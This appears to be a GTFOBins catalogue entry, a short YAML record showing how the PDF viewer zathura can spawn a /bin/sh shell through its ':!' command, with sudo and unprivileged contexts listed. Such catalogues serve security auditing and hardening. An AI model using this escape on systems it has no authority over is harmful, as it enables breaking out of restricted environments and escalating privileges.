<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/zathura -->
---
comment: |-
  This requires a running X server.
functions:
  shell:
  - code: |-
      zathura
      :! /bin/sh -c 'exec /bin/sh 0<&1'
    comment: |-
      The interaction happens in a GUI window, while the shell is dropped in the terminal.
    contexts:
      sudo:
      unprivileged:
...
